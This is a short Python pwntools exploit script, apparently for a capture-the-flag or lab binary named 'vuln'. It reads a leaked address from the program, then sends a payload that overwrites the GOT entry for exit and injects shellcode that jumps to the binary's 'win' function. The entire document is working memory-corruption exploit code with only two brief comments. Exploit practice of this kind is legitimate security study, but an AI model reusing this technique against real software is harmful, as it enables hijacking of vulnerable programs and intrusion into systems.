#!/usr/bin/python3
from pwn import *
exe = ELF('./vuln')
p = process(['./vuln', 'argv'])
print(p.recvline().decode('utf-8'))
first = int(p.recvline().decode('utf-8').strip('\n'))
print(first)
print(p.recvline().decode('utf-8').strip('\n'))
#p.sendline('AAAA')
# push the address of win onto the stack and return
# to go to that function
shellcode = b'\x68'+p32(exe.symbols['win'])+b'\xc3'
sixth = p32(exe.got['exit']-12)+p32(first+8)
p.sendline(sixth+shellcode)
print(p.recvline().decode('utf-8'))